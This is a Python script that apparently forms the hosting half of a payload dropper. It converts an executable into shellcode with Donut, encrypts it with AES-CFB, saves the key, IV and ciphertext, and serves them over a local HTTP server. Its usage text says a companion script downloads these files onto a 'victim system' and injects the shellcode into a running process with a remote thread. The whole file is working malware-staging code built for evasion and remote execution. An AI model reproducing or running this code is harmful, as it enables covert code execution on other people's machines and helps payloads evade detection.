import sys
import os
import donut
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import subprocess
import socket
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES


verbose = True

def encrypt(file_name):

    shellcode = donut.create(file_name, arch=2)
    key = get_random_bytes(16)

    try:
        cipher = AES.new(key, AES.MODE_CFB)  # CFB mode
        ciphered_data = cipher.encrypt(shellcode)
        iv = cipher.iv
    except :
        print("Error encrypting! ")
        sys.exit()

    fk = open('key.bin', 'wb')
    fk.write(key)
    fk.close()

    fiv = open('iv.bin', 'wb')
    fiv.write(iv)
    fiv.close()

    cr_sc = open('file', 'wb')
    cr_sc.write(ciphered_data)
    cr_sc.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 1))
    IPAddr = s.getsockname()[0]

    host = subprocess.run("python -m http.server --bind " + str(IPAddr))
    print("Hosting: ", host)
    print("Hosting files on " + str(IPAddr) + ":8000 from " + os.getcwd())


if len(sys.argv) < 2:

    print("""
    
    A payload dropper, currently only for 64 bit ones that converts file to Shellcode with Donut,
    and encrypt it with AES CFB and store the 16 bit Key, IV and the Contents. 
    On the victim system, those files would be downloaded, and then the actual shellcode content will be
    injected into the running parent python process and a remote thread will be executed.
    
    Usage:
    
    host.py filename.ext -> Shellcodize, Encrypt and Host the file.
    drop.py ip.ip.ip.ip:port -> download the files and execute
    
    """)

try:
    file_name = sys.argv[1]
    encrypt(file_name)
except:
    file_name = False
    print("Make sure the file path is okay! ")
    sys.exit()




